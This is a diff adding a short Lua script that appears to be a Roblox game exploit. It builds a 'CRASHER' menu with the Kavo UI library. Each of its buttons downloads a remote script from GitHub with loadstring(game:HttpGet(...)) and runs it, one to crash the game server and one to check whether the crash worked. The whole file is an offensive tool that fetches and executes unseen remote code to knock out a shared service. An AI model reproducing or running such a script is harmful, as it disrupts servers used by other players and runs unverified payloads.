@@ -1,0 +1,12 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("CRASHER", "Midnight")
+local Tab = Window:NewTab("Crasher")
+local Section = Tab:NewSection("ENCRYPT")
+Section:NewLabel("Crash Using This")
+Section:NewButton("Click me for crash", "Usses 15 min encrypt crasher.", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
+end)
+
+Section:NewButton("CHECKS IF CRASHED CLICK :", "ONLY USE THIS IF YOU BELIEVE IT CRASHED.", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/grandpascripts/error502/main/CrasherNotifer.lua"))()
+end)
